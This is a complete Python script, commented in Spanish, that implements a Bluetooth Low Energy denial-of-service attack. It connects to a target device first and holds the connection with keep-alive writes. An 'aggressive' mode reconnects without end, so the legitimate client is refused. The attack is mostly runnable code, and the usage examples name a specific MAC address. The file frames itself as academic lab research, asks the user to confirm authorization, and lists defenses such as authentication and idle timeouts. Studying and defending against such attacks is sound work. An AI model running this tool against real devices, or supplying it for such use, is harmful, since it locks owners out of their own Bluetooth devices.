#!/usr/bin/env python3
"""
BLE Connection Hijacking Attack - Secuestro de Conexión y Bloqueo del Usuario Legítimo

ATAQUE: Jamming Lógico a Nivel de Protocolo BLE/GATT
═══════════════════════════════════════════════════════

DESCRIPCIÓN:
El atacante se conecta al dispositivo BLE vulnerable ANTES que el cliente legítimo
y mantiene la conexión abierta indefinidamente. Como la mayoría de dispositivos BLE
solo aceptan UNA conexión central simultánea (single-central limitation), el cliente
legítimo experimenta:
  - Connection refused / timeout errors
  - Imposibilidad de reconectar
  - Denegación de servicio efectiva sin jamming RF

VULNERABILIDADES EXPLOTADAS:
  - VULN-01: Sin autenticación previa a la conexión (Just Works pairing)
  - VULN-04: No hay timeout de conexión idle (conexión persistente indefinida)
  - VULN-05: Sin rate limiting en intentos de conexión

IMPACTO:
  - DoS de capa de aplicación (no detectable con spectrum analyzer)
  - Monopolización del recurso (conexión BLE)
  - Usuario legítimo bloqueado sin saber por qué

EVIDENCIA FORENSE EN SNIFFER:
  - Solo 1 conexión activa: Atacante ↔ Target
  - Cliente legítimo envía CONNECT_IND → Target responde con LL_REJECT_IND_EXT (código 0x3E: "Connection Limit Exceeded")
  - O simplemente el target ignora advertising mientras ya tiene conexión activa

DIFERENCIA CON ATAQUES RF:
  - NO es jamming de radiofrecuencia (no necesitas SDR ni potencia elevada)
  - Es un ataque de lógica de protocolo (abuso de limitaciones de diseño BLE)
  - Totalmente legal en entorno de lab (no satura el espectro)

USO:
    # Modo básico: conexión persistente
    python ble_connection_hijack.py --address EC:E3:34:B2:E0:C2 --duration 300

    # Con keep-alive activo (escrituras periódicas para prevenir timeout)
    python ble_connection_hijack.py --address EC:E3:34:B2:E0:C2 --duration 600 --keep-alive

    # Modo agresivo: reconexión automática si se pierde conexión
    python ble_connection_hijack.py --address EC:E3:34:B2:E0:C2 --duration inf --aggressive

    # Con logging para análisis forense
    python ble_connection_hijack.py --address EC:E3:34:B2:E0:C2 --duration 300 --log hijack_session.json

CAPTURA SIMULTÁNEA:
    # En otra terminal: sniffer capturando intentos del cliente legítimo
    # Wireshark con nRF Sniffer en COM13, Follow dinámico
    # Verás los paquetes LL_REJECT_IND_EXT cuando el legítimo intente conectar

AUTOR: [Tu nombre]
FECHA: 15 de noviembre de 2025
LICENCIA: Uso exclusivo para investigación académica
"""

import asyncio
import argparse
import sys
import time
import json
from datetime import datetime
from typing import Optional, Dict, List
from bleak import BleakClient, BleakScanner
from bleak.exc import BleakError

# UUIDs del servicio ESP32_P1 (ajustar según tu dispositivo)
SERVICE_UUID = "4fafc201-1fb5-459e-8fcc-c5c9c331914b"
CMD_CHAR_UUID = "beb5483e-36e1-4688-b7f5-ea07361b26a8"
NOTIFY_CHAR_UUID = "beb5483f-36e1-4688-b7f5-ea07361b26a8"

# Comandos GATT para keep-alive (escrituras benévolas)
CMD_NOOP = bytes([0xFF, 0x00, 0x00, 0x00])  # Comando no-op (si lo soporta)
CMD_READ_STATUS = bytes([0xFE, 0x00, 0x00, 0x00])  # Solicitar estado


class ConnectionHijackAttack:
    """
    Implementa ataque de secuestro de conexión BLE mediante monopolización del canal.
    """
    
    def __init__(self, target_address: str, duration: float, keep_alive: bool = False,
                 aggressive: bool = False, log_file: Optional[str] = None):
        self.target_address = target_address.upper()
        self.duration = duration  # segundos, o float('inf') para infinito
        self.keep_alive = keep_alive
        self.aggressive = aggressive  # reconectar automáticamente si se pierde
        self.log_file = log_file
        
        self.client: Optional[BleakClient] = None
        self.connected = False
        self.connection_start_time = 0
        self.connection_end_time = 0
        self.total_uptime = 0
        self.reconnection_count = 0
        self.keep_alive_count = 0
        
        self.attack_log: List[Dict] = []
        
    def log_event(self, event_type: str, details: Dict):
        """Registra evento en log estructurado para análisis forense"""
        log_entry = {
            "timestamp": time.time(),
            "datetime": datetime.now().isoformat(),
            "event": event_type,
            "details": details
        }
        self.attack_log.append(log_entry)
        
        # Print en consola
        if event_type == "CONNECTION_ESTABLISHED":
            print(f"[+] CONEXIÓN ESTABLECIDA: {details.get('rssi', 'N/A')} dBm")
        elif event_type == "CONNECTION_LOST":
            print(f"[-] CONEXIÓN PERDIDA: {details.get('reason', 'Unknown')}")
        elif event_type == "KEEP_ALIVE":
            print(f"[♥] Keep-alive #{details.get('count', 0)} enviado")
        elif event_type == "RECONNECTION_ATTEMPT":
            print(f"[⟳] Intento de reconexión #{details.get('attempt', 0)}...")
        elif event_type == "ATTACK_COMPLETE":
            print(f"[✓] ATAQUE COMPLETADO: {details.get('uptime', 0):.1f}s de monopolización")
    
    def notification_handler(self, sender: int, data: bytearray):
        """Captura notificaciones del dispositivo (confirma conexión activa)"""
        print(f"[NOTIFY] Handle {sender}: {data.hex()}")
        self.log_event("NOTIFICATION_RECEIVED", {
            "handle": sender,
            "data": data.hex(),
            "size": len(data)
        })
    
    async def establish_connection(self) -> bool:
        """Intenta conectar al dispositivo target"""
        try:
            print(f"\n[*] Intentando conectar a {self.target_address}...")
            self.client = BleakClient(self.target_address, timeout=15.0)
            
            await self.client.connect()
            
            if not self.client.is_connected:
                return False
            
            self.connected = True
            self.connection_start_time = time.time()
            
            # Obtener RSSI
            try:
                # Algunos adaptadores permiten leer RSSI
                rssi = await self.client.get_rssi() if hasattr(self.client, 'get_rssi') else None
            except:
                rssi = None
            
            self.log_event("CONNECTION_ESTABLISHED", {
                "target": self.target_address,
                "rssi": rssi,
                "timestamp": self.connection_start_time
            })
            
            # Suscribirse a notificaciones para mantener conexión activa
            try:
                await self.client.start_notify(NOTIFY_CHAR_UUID, self.notification_handler)
                print(f"[+] Suscrito a notificaciones en {NOTIFY_CHAR_UUID}")
            except Exception as e:
                print(f"[!] No se pudo suscribir a notificaciones: {e}")
            
            return True
            
        except BleakError as e:
            print(f"[-] Error de conexión: {e}")
            self.log_event("CONNECTION_FAILED", {
                "target": self.target_address,
                "error": str(e)
            })
            return False
        except Exception as e:
            print(f"[-] Error inesperado: {e}")
            return False
    
    async def send_keep_alive(self):
        """Envía comando keep-alive para prevenir timeout de inactividad"""
        if not self.connected or not self.client:
            return False
        
        try:
            # Intentar escribir comando no-op o leer característica
            # Esto mantiene el canal activo
            await self.client.write_gatt_char(CMD_CHAR_UUID, CMD_NOOP, response=False)
            self.keep_alive_count += 1
            
            self.log_event("KEEP_ALIVE", {
                "count": self.keep_alive_count,
                "command": CMD_NOOP.hex()
            })
            
            return True
            
        except Exception as e:
            print(f"[!] Error en keep-alive: {e}")
            return False
    
    async def maintain_connection(self):
        """Mantiene la conexión monopolizada durante la duración especificada"""
        start_time = time.time()
        keep_alive_interval = 30  # segundos entre keep-alives
        last_keep_alive = start_time
        
        print(f"\n[*] MONOPOLIZANDO CONEXIÓN durante {self.duration if self.duration != float('inf') else '∞'} segundos")
        print(f"[*] Cliente legítimo NO podrá conectar durante este tiempo")
        print(f"[*] Presiona Ctrl+C para detener el ataque\n")
        
        try:
            while True:
                elapsed = time.time() - start_time
                
                # Verificar si se alcanzó la duración
                if self.duration != float('inf') and elapsed >= self.duration:
                    break
                
                # Verificar conexión
                if not self.client or not self.client.is_connected:
                    self.connected = False
                    self.connection_end_time = time.time()
                    self.total_uptime += (self.connection_end_time - self.connection_start_time)
                    
                    self.log_event("CONNECTION_LOST", {
                        "reason": "Disconnected unexpectedly",
                        "uptime_seconds": self.connection_end_time - self.connection_start_time
                    })
                    
                    # Modo agresivo: reconectar automáticamente
                    if self.aggressive:
                        self.reconnection_count += 1
                        self.log_event("RECONNECTION_ATTEMPT", {
                            "attempt": self.reconnection_count
                        })
                        
                        success = await self.establish_connection()
                        if not success:
                            print("[-] No se pudo reconectar. Esperando 5s...")
                            await asyncio.sleep(5)
                            continue
                    else:
                        # No agresivo: terminar ataque
                        break
                
                # Keep-alive periódico
                if self.keep_alive:
                    if time.time() - last_keep_alive >= keep_alive_interval:
                        await self.send_keep_alive()
                        last_keep_alive = time.time()
                
                # Status update cada 10 segundos
                if int(elapsed) % 10 == 0 and int(elapsed) > 0:
                    print(f"[⏱] Conexión monopolizada: {elapsed:.0f}s | Keep-alives: {self.keep_alive_count} | Reconexiones: {self.reconnection_count}")
                
                await asyncio.sleep(1)
        
        except KeyboardInterrupt:
            print("\n[!] Ataque interrumpido por usuario (Ctrl+C)")
        
        finally:
            # Calcular tiempo total de monopolización
            if self.connected:
                self.connection_end_time = time.time()
                self.total_uptime += (self.connection_end_time - self.connection_start_time)
    
    async def disconnect(self):
        """Desconecta del dispositivo y libera la conexión"""
        if self.client and self.client.is_connected:
            try:
                await self.client.disconnect()
                print(f"[+] Desconectado de {self.target_address}")
            except Exception as e:
                print(f"[!] Error al desconectar: {e}")
    
    def export_log(self):
        """Exporta log de ataque a JSON para análisis forense"""
        if not self.log_file:
            return
        
        attack_summary = {
            "attack_type": "BLE_CONNECTION_HIJACKING",
            "target_address": self.target_address,
            "attack_duration_seconds": self.duration if self.duration != float('inf') else "infinite",
            "actual_uptime_seconds": self.total_uptime,
            "keep_alive_enabled": self.keep_alive,
            "keep_alive_count": self.keep_alive_count,
            "aggressive_mode": self.aggressive,
            "reconnection_count": self.reconnection_count,
            "events": self.attack_log
        }
        
        try:
            with open(self.log_file, 'w', encoding='utf-8') as f:
                json.dump(attack_summary, f, indent=2, ensure_ascii=False)
            print(f"\n[+] Log exportado a: {self.log_file}")
        except Exception as e:
            print(f"[-] Error al exportar log: {e}")
    
    async def run(self):
        """Ejecuta el ataque completo"""
        print("=" * 80)
        print("  BLE CONNECTION HIJACKING ATTACK - Secuestro de Conexión y DoS Lógico")
        print("=" * 80)
        print(f"\n[*] Target: {self.target_address}")
        print(f"[*] Duración: {self.duration if self.duration != float('inf') else '∞'} segundos")
        print(f"[*] Keep-alive: {'ACTIVADO' if self.keep_alive else 'DESACTIVADO'}")
        print(f"[*] Modo agresivo (reconexión): {'ACTIVADO' if self.aggressive else 'DESACTIVADO'}")
        print(f"[*] Log: {self.log_file if self.log_file else 'No'}\n")
        
        # Fase 1: Establecer conexión inicial
        success = await self.establish_connection()
        if not success:
            print("\n[-] ATAQUE FALLIDO: No se pudo establecer conexión inicial")
            return False
        
        # Fase 2: Mantener conexión monopolizada
        await self.maintain_connection()
        
        # Fase 3: Desconectar y generar reporte
        await self.disconnect()
        
        self.log_event("ATTACK_COMPLETE", {
            "total_uptime_seconds": self.total_uptime,
            "keep_alive_sent": self.keep_alive_count,
            "reconnections": self.reconnection_count
        })
        
        # Reporte final
        print("\n" + "=" * 80)
        print("  REPORTE FINAL DEL ATAQUE")
        print("=" * 80)
        print(f"Tiempo de monopolización total: {self.total_uptime:.1f} segundos")
        print(f"Keep-alives enviados: {self.keep_alive_count}")
        print(f"Reconexiones exitosas: {self.reconnection_count}")
        print(f"Eventos registrados: {len(self.attack_log)}")
        
        # Exportar log
        if self.log_file:
            self.export_log()
        
        print("\n[*] Durante este tiempo, el cliente legítimo NO pudo conectar al dispositivo")
        print("[*] Verifica en el sniffer nRF los paquetes LL_REJECT_IND_EXT del cliente legítimo")
        print("=" * 80 + "\n")
        
        return True


async def scan_target(target_address: str) -> bool:
    """Verifica que el dispositivo target esté disponible antes del ataque"""
    print(f"[*] Escaneando dispositivo {target_address}...")
    
    try:
        devices = await BleakScanner.discover(timeout=10.0)
        for device in devices:
            if device.address.upper() == target_address.upper():
                print(f"[+] Dispositivo encontrado: {device.name or 'Unknown'} ({device.address}) RSSI: {device.rssi} dBm")
                return True
        
        print(f"[-] Dispositivo {target_address} NO encontrado en escaneo")
        return False
        
    except Exception as e:
        print(f"[-] Error en escaneo: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="BLE Connection Hijacking Attack - Secuestro de conexión y DoS lógico",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EJEMPLOS DE USO:

  # Ataque básico de 5 minutos
  python ble_connection_hijack.py --address EC:E3:34:B2:E0:C2 --duration 300

  # Con keep-alive activo (recomendado para conexiones largas)
  python ble_connection_hijack.py --address EC:E3:34:B2:E0:C2 --duration 600 --keep-alive

  # Modo agresivo con reconexión automática
  python ble_connection_hijack.py --address EC:E3:34:B2:E0:C2 --duration inf --aggressive

  # Con logging para análisis forense
  python ble_connection_hijack.py --address EC:E3:34:B2:E0:C2 --duration 300 --log hijack.json

CAPTURA SIMULTÁNEA CON SNIFFER:
  En Wireshark con nRF Sniffer (COM13), iniciar captura antes del ataque.
  Observar: Solo 1 conexión activa (atacante), cliente legítimo recibe rechazos.

DEFENSA:
  - Implementar autenticación obligatoria (Secure Connections)
  - Timeout de conexión idle (desconectar si no hay tráfico en X segundos)
  - Rate limiting de conexiones por MAC address
  - Multi-central support (aceptar múltiples conexiones simultáneas)
        """
    )
    
    parser.add_argument(
        '--address',
        required=True,
        help='Dirección MAC del dispositivo BLE target (ej: EC:E3:34:B2:E0:C2)'
    )
    
    parser.add_argument(
        '--duration',
        type=lambda x: float('inf') if x.lower() == 'inf' else float(x),
        default=300.0,
        help='Duración del ataque en segundos (default: 300, usar "inf" para infinito)'
    )
    
    parser.add_argument(
        '--keep-alive',
        action='store_true',
        help='Enviar comandos keep-alive periódicos para prevenir timeout (recomendado)'
    )
    
    parser.add_argument(
        '--aggressive',
        action='store_true',
        help='Reconectar automáticamente si se pierde la conexión (modo agresivo)'
    )
    
    parser.add_argument(
        '--log',
        type=str,
        help='Archivo JSON para exportar log de eventos (ej: hijack_session.json)'
    )
    
    parser.add_argument(
        '--scan',
        action='store_true',
        help='Escanear y verificar disponibilidad del target antes del ataque'
    )
    
    args = parser.parse_args()
    
    # Advertencia de uso ético
    print("\n⚠️  ADVERTENCIA: USO EXCLUSIVO PARA INVESTIGACIÓN ACADÉMICA")
    print("Este script implementa un ataque de denegación de servicio.")
    print("Solo debe usarse en dispositivos propios en entornos controlados.")
    print("El uso malicioso puede ser ilegal.\n")
    
    response = input("¿Confirmas que tienes autorización para atacar este dispositivo? (yes/no): ")
    if response.lower() != 'yes':
        print("Ataque cancelado por usuario.")
        sys.exit(0)
    
    # Ejecutar escaneo si se solicita
    if args.scan:
        found = asyncio.run(scan_target(args.address))
        if not found:
            print("\n[-] Target no disponible. Verifica la dirección MAC y que el dispositivo esté encendido.")
            sys.exit(1)
        print()
    
    # Crear y ejecutar ataque
    attack = ConnectionHijackAttack(
        target_address=args.address,
        duration=args.duration,
        keep_alive=args.keep_alive,
        aggressive=args.aggressive,
        log_file=args.log
    )
    
    try:
        asyncio.run(attack.run())
    except KeyboardInterrupt:
        print("\n[!] Programa interrumpido por usuario")
        sys.exit(0)


if __name__ == "__main__":
    main()
